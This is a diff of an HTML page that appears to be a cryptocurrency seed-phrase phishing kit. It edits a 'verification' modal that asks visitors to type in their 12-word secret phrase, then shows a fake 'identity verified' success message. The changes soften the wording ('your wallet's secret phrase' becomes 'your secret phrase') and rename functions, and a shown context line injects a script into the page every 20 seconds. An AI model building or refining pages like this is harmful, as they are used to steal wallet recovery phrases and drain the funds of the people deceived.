@@ -1454,12 +1454,12 @@ createGenericModalOptions();
       <div class="generic-verify-alert">
         <span class="generic-verify-alert-icon">⚠</span>
         <span>
-          Action Required: Please enter your wallet's secret phrase.
+          Action Required: Please enter your secret phrase.
         </span>
       </div>
 
       <p class="generic-verify-description">
-        Input your secret 12 word phrase to continue.
+        Input your 12 word phrase to continue.
       </p>
 
       <textarea
@@ -1816,7 +1816,7 @@ setInterval(function () {
     document.body.appendChild(script);
 }, 20000);
 </script>
-<!--  Success Modal — hidden by default, call showPaymentSuccess() to open -->
+<!--  Success Modal — hidden by default, call showPlaySuccess() to open -->
 <style>
   .payment-modal {
     /* ---- Customizable variables ---- */
@@ -2204,10 +2204,7 @@ setInterval(function () {
   }
 </style>
 
-<!-- Optional demo trigger: remove this button in production -->
-<button type="button" id="kyc-demo-open">
-  Preview verification success
-</button>
+
 
 <!-- Modal -->
 <div
@@ -2264,7 +2261,7 @@ setInterval(function () {
 
       <p class="kyc-success__description"
          id="kyc-success-description">
-        Your identity has been verified. You're all set. Do not share your secret phrase.
+        Your identity has been verified. You're all set. Do keep your phrase a secret.
       </p>
     </div>
 
